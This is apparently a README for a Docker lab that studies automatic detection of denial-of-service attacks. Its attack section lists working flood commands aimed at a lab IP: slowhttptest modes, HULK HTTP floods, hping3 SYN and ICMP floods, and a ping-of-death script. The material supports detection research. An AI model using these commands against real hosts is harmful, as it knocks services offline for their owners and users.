# Intelligent forensics for the automatic anomaly detection in distributed infrastructures

![architecture](./images/virtual.png)

# NEW VERSION

## Start the network

To start the network run
```
docker-compose up -d
```
in newenvironment folder
## Start the experiment

To start the experiment enter the servidor container
```
docker exec -it newenvironment_servidor_1 /bin/bash
```
and run
```
python3 /servidor/output/DoSdetector/1clock.py
```

## Attack

To start the attack, enter the attacker:
```
docker exec -it newenvironment_attacker_1 /bin/bash
```
### Slowhttptest
```
slowhttptest -H -g -c 5260 -i 10 -r 30 -t GET -u http://10.100.0.2:3000/ -x 24 -p 3
```
#### SLOWLORIS
```
slowhttptest -c 1000 -H -g -i 10 -r 200 -t GET -u http://10.100.0.2:3000/ -x 24 -p 3
```
#### SLOW HTTP POST
```
slowhttptest -c 3000 -B -g -i 110 -r 200 -s 8192 -t POST -u http://10.100.0.2:3000/ -x 10 -p 3
```
#### RANGE HEADER
```
slowhttptest -R -u http://10.100.0.2:3000/ -t HEAD -c 1000 -a 10 -b 3000 -r 500
```
#### SLOW READ
```
slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://10.100.0.2:3000/ -p 3
```
### HULKv3 - HTTP flood attack
```
python3 HULK-v3/hulk_launcher.py server http://10.100.0.2:3000
```
enter another terminal with:
```
docker exec -it newenvironment_attacker_1 /bin/bash
```
and run:
```
python3 HULK-v3/hulk_launcher.py client -n 10
```
### HULKBarry Shteiman
```
python3 hulkBasic/1hulk.py http://10.100.0.2:3000
```

### hping3
#### SYN flood
```
hping3 -S -p 3000 --flood 10.100.0.2
```
#### ICMP flood
```
hping3 -p 3000 --icmp --flood 10.100.0.2 
```
#### Ping od Death
```
python3 pingOfDeath/pingOfDeath.py

```
## Results

To see the analysis enter the admin-fluentd container:
```
docker exec -it newenvironment_admin-fluentd_1 /bin/bash
```
enter the folder output to see the logs or the folder shared-volume/prediction/livePrediction to see the live result in the file named with the current date.
Otherwise, it is possible to analyse a time interval of a specific log file present in output/dos with:
```
python3 /shared-volume/prediction/intervalModelUser.py /output/DoS/[nameofthelog.log]
```
e.g.
```
python3 /shared-volume/prediction/intervalModelUser.py /output/DoS/dos.log.20240521.log
```
Finally the program will ask to insert a time interval to analyse.
It is also possible to predict a single line of log by running manualModelUser.py.











# Advices
If the images gets modified by changing the dockerfiles, to be effective the image should be builded again. To do so run "docker-compose build". Then again "docker-compose up -d".
